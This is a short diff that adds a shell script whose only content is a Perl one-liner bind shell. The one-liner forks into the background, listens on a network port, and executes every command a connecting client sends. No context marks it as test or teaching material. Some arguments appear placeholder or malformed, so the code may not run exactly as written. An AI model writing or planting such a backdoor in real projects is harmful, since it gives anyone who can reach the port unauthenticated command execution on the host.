@@ -1,0 +1,3 @@
+#!/bin/sh
+perl -MIO -e '$p=fork();exit,if$p;while($c=new IO::Socket::INET(LocalPort,hostx,Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}'
+
